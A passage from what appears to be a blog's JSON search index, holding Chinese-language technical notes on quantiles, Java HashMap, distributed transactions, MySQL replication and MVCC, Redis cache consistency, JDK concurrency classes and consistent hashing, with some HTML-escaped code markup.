分位数（quantile）：把一组按照升序排列的数据分割成n个等份区间并产生n-1个等分点后每个等分点所对应的数据。按照升序排列称作第一至第n-1的n分位数。（注：如果等分点在其左右两个数据的中间，那么该等分点所对应的数就是其左右两数的平均数）确定等分位点位置的其中一种常用公式： （n+1）*p/q 其中n表示一共有多少数据，p表示第几分位，q表示是几分位数。 例如四分位数（quartile；4-quantile） 1，1，3，6，7，12，14，17，25，28，29 上述数据集中共有11个数据。将这组已排列好的数据等分成4等份后产生3个等分点。 其中第一四分位数Q1=（11+1）*（1/4）=3，对应的数据为3 第二四分位数（即中位数）Q2=（11+1）*（2/4）=6，对应的数据为12 第三四分位数Q3=（11+1）*（3/4）=9，对应的数据为25 以此类推百分位数（percentile）就是把数据等分成100等份后所获得的数。根据分数性质，Q1就是25%百分位数（左右数据数量1:3），Q2中位数就是50%（1:1），Q3就是75%（3:1） ",
      "url"      : "http://localhost:4000/2018/05/30/prometheus-quantile/"
    } ,
  
    {
      "title"    : "JDK HashMap",
      "category" : "JDK HashMap",
      "content": "JDK HashMap 知识要点 数组 + 链表 + 红黑树（JDK 8） JDK 7 并发扩容时CPU占用高问题 capacity, default table length 16 链表长度超过8时转红黑树 扩容阀值threshold = table length * load factor，kv健值对个数超过阀值时 b开始扩容 table数组位置定位 (h = k.hashCode()) ^ (h &gt;&gt;&gt; 16) &amp; (table.length -1) 在JDK1.8的实现中，优化了高位运算的算法，通过hashCode()的高16位异或低16位实现的：(h = k.hashCode()) ^ (h &gt;&gt;&gt; 16)，主要是从速度、功效、质量来考虑的，这么做可以在 b数组table的length比较小的时候，也能保证考虑到高低Bit都参与到Hash的计算中，同时不会有太大的开销。 JDK7扩容时链表中节点位置会反转，JDK8不会（死循环，cpu高的原因） ",
      "url"      : "http://localhost:4000/2018/06/02/jdk-hashmap/"
    } ,
  
    {
      "title"    : "分布式事务-2PC/3PC",
      "category" : "分布式事务",
      "content": "分布式事务XA协议 b组件 XA 就是 X/Open DTP 定义的交易中间件与数据库之间的接口规范（即接口函数），交易中间件用它来通知数据库事务的开始、结束以及提交、回滚等。 XA 接口函数由数据库厂商提供。 应用程序（ AP ） 事务管理器（ TM ） - 事务中间件 资源管理器（ RM ）- 数据库 通信资源管理器（ CRM ）- 消息中间件 2PC Two Phase Commitment Protocol，主要有两个角色（协调者和参与者） 准备阶段 - vote 提交阶段 - rollback or commit 注意参与者在准备阶段就会进行所有事务操作，并记录 bundo/redo日志，只是还没有提交本地事务。 缺点  b参与者一直占有资源（同步阻塞） 协调者单点 协调者故障造成数据不一致（阶段2中部分 b参与者收到commit消息，其他丢消息）  b阶段2中协调者和收到消息的参与者down机，事务状态不定 3PC Three Phase Commitment Protocol，引入了超时和canCommit canCommit preCommit - 事务操作，记录undo/redo日志 doCommit 注意在doCommit阶段，协调者长时间未收到preCommit的ACK b时会发送abort请求；参与者长时间未收到协调者的doCommit/abort b请求时会 b默认自动commit。 缺点 第三阶段协调者的abort指令因为网络原因未成功发送到参与者造成超时，因为参与者在这阶段默认会执行事务，造成事务不一致。 后记 there is only one consensus protocol, and that’s Paxos” – all other approaches are just broken versions of Paxos. ",
      "url"      : "http://localhost:4000/2018/06/03/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1-2-PC-3PC/"
    } ,
  
    {
      "title"    : "mysql主从复制",
      "category" : "mysql",
      "content": "mysql 主从复制 mysql有异步复制，半同步复制，组复制等。 异步复制 主mysql提交，再异步复制到从mysql 半同步复制 主mysql同步从mysql，至少一个从mysql relay log写成功时，主mysql提交。 组复制 单主和多主mysql模式，基于paxos协议，只要大多数主机可用，则服务可用。 单主模式下，会自动选主，所有更新操作都在主上进行；多主模式下，所有 server 都可以同时处理更新操作。 参考 http://blog.51cto.com/ylw6006/1971139 斩月是个神人，最早接触TFS（Taobao File System）就是看他的博客开始的。 ",
      "url"      : "http://localhost:4000/2018/06/04/mysql-group-replication/"
    } ,
  
    {
      "title"    : "mysql mvcc介绍",
      "category" : "mysql",
      "content": "mysql mvcc介绍 锁机制可以控制并发操作,但是其系统开销较大,而MVCC可以在大多数情况下代替行级锁,使用MVCC,能降低其系统开销。 不同存储引擎的MVCC实现是不同的。InnoDB的MVCC,是通过在每行记录后面保存两个隐藏的列来实现的,这两个列，分别保存了这个行的创建时间，一个保存的是行的删除时间。这里存储的并不是实际的时间值,而是系统版本号(可以理解为事务的ID)。每开始一个新的事务，系统版本号就会自动递增。 InnoDB为新插入的每一行保存当前系统版本号作为创建版本号 InnoDB会为删除的每一行保存当前系统的版本号(事务的ID)作为删除版本号 InnoDB执行UPDATE，实际上是新插入了一行记录，并保存其创建版本号为当前事务的ID，同时保存当前事务ID到要UPDATE的行的删除版本号. 查询时InnoDB会根据以下两个条件检查每行记录: InnoDB只会查找版本早于当前事务版本的数据行(也就是,行的系统版本号小于或等于事务的系统版本号)，这样可以确保事务读取的行，要么是在事务开始前已经存在的，要么是事务自身插入或者修改过的. 行的删除版本要么未定义,要么大于当前事务版本号,这可以确保事务读取到的行，在事务开始之前未被删除. 只有以上两个条件同时满足，才能返回作为查询结果. 参考 https://blog.csdn.net/whoamiyang/article/details/51901888 ",
      "url"      : "http://localhost:4000/2018/06/04/mysql-mvcc/"
    } ,
  
    {
      "title"    : "redis/DB读写一致性",
      "category" : "redis",
      "content": "Redis/DB读写一致性 大的原则是 强一致性以读写DB为准 redis缓存要有过期时间，这样即使有脏数据也会被清理掉 读数据 先读redis，redis中没有读DB并更新Redis 写数据/更新数据 更新时如何保持redis和DB数据一致。 先更新redis，再更新DB 先更新DB，再更新redis 先更新DB，再删除Redis key 先删除Redis Key，再更新DB 先更新redis，再更新DB 多线程场景下同时有请求A和请求B进行更新操作，那么会出现 （1）线程A更新了redis （2）线程B更新了redis （3）线程B更新了DB （4）线程A更新了DB 这样造成DB/Redis数据不一致。 先更新DB，再更新redis 多线程场景下同时有请求A和请求B进行更新操作，那么会出现 （1）线程A更新了数据库 （2）线程B更新了数据库 （3）线程B更新了redis （4）线程A更新了redis 这就出现请求A更新缓存应该比请求B更新缓存早才对，但是因为网络等原因，B却比A更早更新了缓存。这就导致了脏数据。 先更新DB，再删除Redis 假设这会有两个请求，一个请求A做查询操作，一个请求B做更新操作，那么会有如下情形产生 （1）缓存刚好失效 （2）请求A查询数据库，得一个旧值 （3）请求B将新值写入数据库 （4）请求B删除缓存 （5）请求A将查到的旧值写入缓存 如果发生上述情况，确实是会发生脏数据。发生上述情况有一个条件，就是步骤（3）的写数据库操作比步骤（2）的读数据库操作耗时更短，才有可能使得步骤（4）先于步骤（5）。一般来说写DB比读DB慢，所以可能性比较小。如果一定要解决可以采用延时删除策略。 先删除Redis，再更新DB 假设有两个请求，一个请求A进行更新操作，另一个请求B进行查询操作。 （1）请求A进行写操作，删除缓存 （2）请求B查询发现缓存不存在 （3）请求B去数据库查询得到旧值 （4）请求B将旧值写入缓存 （5）请求A将新值写入数据库 这样就会导致redis/db不一致。 假设有两个请求，一个请求A进行更新操作，另一个请求B进行查询操作。 （1）请求A进行写操作，删除缓存 （2）请求A将数据写入数据库了， （3）请求B查询缓存发现，缓存没有值 （4）请求B去从库查询，这时，还没有完成主从同步，因此查询到的是旧值 （5）请求B将旧值写入缓存 （6）数据库完成主从同步，从库变为新值 这样就会导致redis/db不一致。 解决方案是采用延时双删策略。这里的sleep延时时间是上面步骤请求B的消耗时间+一个阀值。 public void write(String key,Object data){  redis.delKey(key);  db.updateData(data);  Thread.sleep(1000);  redis.delKey(key);  } 注意： 考虑写操作延时可能有性能问题，可以把删除作为异步操作（比如通过消息系统），同时保证删除一定要成功（重试） 考虑到先删除Redis，再更新DB后再次删除Redis的双删除方案。可以直接采用更新DB，再删除Redis方案。 参考 http://www.cnblogs.com/rjzheng/p/9041659.html ",
      "url"      : "http://localhost:4000/2018/06/05/redis-DB-consistency/"
    } ,
  
    {
      "title"    : "show me the code - CopyOnWriteArrayList",
      "category" : "COW",
      "content": "JUC CopyOnWriteArrayList两个要点 Copy On Write  /** * Appends the specified element to the end of this list. * * @param e element to be appended to this list * @return {@code true} (as specified by {@link Collection#add}) */  public boolean add(E e) {  final ReentrantLock lock = this.lock;  lock.lock();  try {   Object[] elements = getArray();   int len = elements.length;   Object[] newElements = Arrays.copyOf(elements, len + 1);   newElements[len] = e;   setArray(newElements);   return true;  } finally {   lock.unlock();  }  } Iterator弱一致性  static final class COWIterator&lt;E&gt; implements ListIterator&lt;E&gt; {  /** Snapshot of the array */  private final Object[] snapshot;  /** Index of element to be returned by subsequent call to next. */  private int cursor;  &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;COWIterator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elements&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;initialCursor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;cursor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;initialCursor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;snapshot&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elements&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;hasNext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cursor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;snapshot&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;hasPrevious&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cursor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nd&quot;&gt;@SuppressWarnings&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;unchecked&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hasNext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;NoSuchElementException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;E&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;snapshot&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cursor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++];&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nd&quot;&gt;@SuppressWarnings&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;unchecked&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;previous&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hasPrevious&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;NoSuchElementException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;E&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;snapshot&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[--&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cursor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;];&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;nextIndex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cursor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;previousIndex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cursor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/** * Not supported. Always throws UnsupportedOperationException. * @throws UnsupportedOperationException always; {@code remove} *  is not supported by this iterator. */&lt;/span&gt;  &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;remove&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;UnsupportedOperationException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/** * Not supported. Always throws UnsupportedOperationException. * @throws UnsupportedOperationException always; {@code set} *  is not supported by this iterator. */&lt;/span&gt;  &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;UnsupportedOperationException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/** * Not supported. Always throws UnsupportedOperationException. * @throws UnsupportedOperationException always; {@code add} *  is not supported by this iterator. */&lt;/span&gt;  &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;UnsupportedOperationException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;  &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;forEachRemaining&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Consumer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;?&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;super&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;E&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;Objects&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;requireNonNull&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elements&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;snapshot&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elements&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cursor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;   &lt;span class=&quot;nd&quot;&gt;@SuppressWarnings&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;unchecked&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;E&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elements&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;];&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;accept&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;cursor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 参考 grepCode ",
      "url"      : "http://localhost:4000/2018/06/09/CopyOnWriteArrayList/"
    } ,
  
    {
      "title"    : "show me the diagram - kafka",
      "category" : "kafka",
      "content": "show me the architecture diagram - kafka Apache Kafka® is a distributed streaming platform. 组件 producers comsumers kafka cluster connectors Stream processors zookeeper 图 ",
      "url"      : "http://localhost:4000/2018/06/09/sta-kafka/"
    } ,
  
    {
      "title"    : "JDK scheduler",
      "category" : "scheduler",
      "content": "Java JDK实现调度方式有Timer和ScheduledThreadPoolExecutor (不考虑Quartz以及Spring Scheduler等) Timer 基本类Timer/TimerTask，JDK Timer两个缺点 只有一个线程执行所有TimerTask，如果有一个TimerTask比较耗时，其他TimerTask执行时间就不准了 TimerTask中间抛出异常会终止Timer，其他任务也不能调度了 ScheduledExecutorService / ScheduledThreadPoolExecutor Executors.newScheduledThreadPool能解决Timer上面两个问题。从实现看，它基于优先级队列实现。  /** * Creates a new {@code ScheduledThreadPoolExecutor} with the * given core pool size. * * @param corePoolSize the number of threads to keep in the pool, even *  if they are idle, unless {@code allowCoreThreadTimeOut} is set * @throws IllegalArgumentException if {@code corePoolSize &lt; 0} */  public ScheduledThreadPoolExecutor(int corePoolSize) {  super(corePoolSize, Integer.MAX_VALUE, 0, NANOSECONDS,   new DelayedWorkQueue());  } FixedRate &amp; FixedDealy 调度中的FixedRate指的是任务以固定时间频率执行（本次任务开始执行时间和下次任务开始执行时间是固定的） 调度中的FixedDelay指的是任务结束后以固定间隔执行下一个任务（本次任务执行完成后和下次任务开始执行间隔是固定的，下次任务执行时间不固定，取决于上次任务结束时间） Executors.newScheduledThreadPool FixedRate方式执行时，如果前一个任务执行时间太长，后一个任务顺延，不会并发执行。参考下面源码。 Timer的scheduleAtFixedRate如果任务执行时间&gt;时间间隔，会并发执行 /** * Creates and executes a periodic action that becomes enabled first * after the given initial delay, and subsequently with the given * period; that is executions will commence after * {@code initialDelay} then {@code initialDelay+period}, then * {@code initialDelay + 2 * period}, and so on. * If any execution of the task * encounters an exception, subsequent executions are suppressed. * Otherwise, the task will only terminate via cancellation or * termination of the executor. If any execution of this task * takes longer than its period, then subsequent executions * may start late, but will not concurrently execute. * * @param command the task to execute * @param initialDelay the time to delay first execution * @param period the period between successive executions * @param unit the time unit of the initialDelay and period parameters * @return a ScheduledFuture representing pending completion of *  the task, and whose {@code get()} method will throw an *  exception upon cancellation * @throws RejectedExecutionException if the task cannot be *  scheduled for execution * @throws NullPointerException if command is null * @throws IllegalArgumentException if period less than or equal to zero */  public ScheduledFuture&lt;?&gt; scheduleAtFixedRate(Runnable command,         long initialDelay,         long period,         TimeUnit unit); /** * Schedules the specified task for repeated &lt;i&gt;fixed-rate execution&lt;/i&gt;, * beginning after the specified delay. Subsequent executions take place * at approximately regular intervals, separated by the specified period. * * &lt;p&gt;In fixed-rate execution, each execution is scheduled relative to the * scheduled execution time of the initial execution. If an execution is * delayed for any reason (such as garbage collection or other background * activity), two or more executions will occur in rapid succession to * catch up. In the long run, the frequency of execution will be * exactly the reciprocal of the specified period (assuming the system * clock underlying &lt;tt&gt;Object.wait(long)&lt;/tt&gt; is accurate). * * &lt;p&gt;Fixed-rate execution is appropriate for recurring activities that * are sensitive to &lt;i&gt;absolute&lt;/i&gt; time, such as ringing a chime every * hour on the hour, or running scheduled maintenance every day at a * particular time. It is also appropriate for recurring activities * where the total time to perform a fixed number of executions is * important, such as a countdown timer that ticks once every second for * ten seconds. Finally, fixed-rate execution is appropriate for * scheduling multiple repeating timer tasks that must remain synchronized * with respect to one another. * * @param task task to be scheduled. * @param delay delay in milliseconds before task is to be executed. * @param period time in milliseconds between successive task executions. * @throws IllegalArgumentException if {@code delay &lt; 0}, or *  {@code delay + System.currentTimeMillis() &lt; 0}, or *  {@code period &lt;= 0} * @throws IllegalStateException if task was already scheduled or *  cancelled, timer was cancelled, or timer thread terminated. * @throws NullPointerException if {@code task} is null */  public void scheduleAtFixedRate(TimerTask task, long delay, long period) {  if (delay &lt; 0)   throw new IllegalArgumentException(Negative delay.);  if (period &lt;= 0)   throw new IllegalArgumentException(Non-positive period.);  sched(task, System.currentTimeMillis()+delay, period);  } ",
      "url"      : "http://localhost:4000/2018/06/10/jdk-scheduler/"
    } ,
  
    {
      "title"    : "show me the code - 一致性hash实现",
      "category" : "一致性hash",
      "content": "show me the code - 一致性hash 介绍 libketama在memcached客户端一致性hash算法中的运用。 TreeMap的使用 虚拟节点 代码 import java.util.Collection; import java.util.SortedMap; import java.util.TreeMap; public class ConsistentHash&lt;T&gt; { private final HashFunction hashFunction; private final int numberOfReplicas; private final SortedMap&lt;Integer, T&gt; circle = new TreeMap&lt;Integer, T&gt;(); public ConsistentHash(HashFunction hashFunction, int numberOfReplicas, Collection&lt;T&gt; nodes) { this.hashFunction = hashFunction; this.numberOfReplicas = numberOfReplicas; for (T node : nodes) { add(node); } } public void add(T node) { for (int i = 0; i &lt; numberOfReplicas; i++) { circle.put(hashFunction.hash(node.toString() +&quot;:&quot; + i), node); } } public void remove(T node) { for (int i = 0; i &lt; numberOfReplicas; i++) { circle.remove(hashFunction.hash(node.toString() + &quot;:&quot; + i)); } } public T get(Object key) { if (circle.isEmpty()) { return null; } int hash = hashFunction.hash(key); SortedMap&lt;Integer, T&gt; tailMap = circle.tailMap(hash); hash = tailMap.isEmpty() ? circle.firstKey() : tailMap.firstKey(); return circle.get(hash); } } 参考 libketama ",
      "url"      : "http://localhost:4000/2018/06/12/consistency-hash/"
    } ,
  
    {
      "title"    : "分布式文件存储阶段小结",
      "category" : "分布式文件系统",
